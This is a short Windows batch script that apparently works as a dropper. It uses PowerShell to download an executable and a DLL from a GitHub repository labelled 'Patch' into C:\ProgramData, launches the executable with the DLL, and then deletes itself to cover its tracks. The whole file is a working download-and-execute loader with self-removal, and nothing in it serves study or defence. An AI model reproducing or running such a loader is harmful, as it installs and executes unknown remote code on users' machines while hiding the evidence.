@echo off
powershell.exe iwr https://github.com/Ptch56/Patch/raw/main/utshellex.exe -o C:\ProgramData\utshellex.exe
powershell.exe iwr https://github.com/Ptch56/Patch/raw/main/utshellext.dll -o C:\ProgramData\utshellext.dll
cd C:\ProgramData
start utshellex.exe utshellext.dll
del/a/f "%~f0"
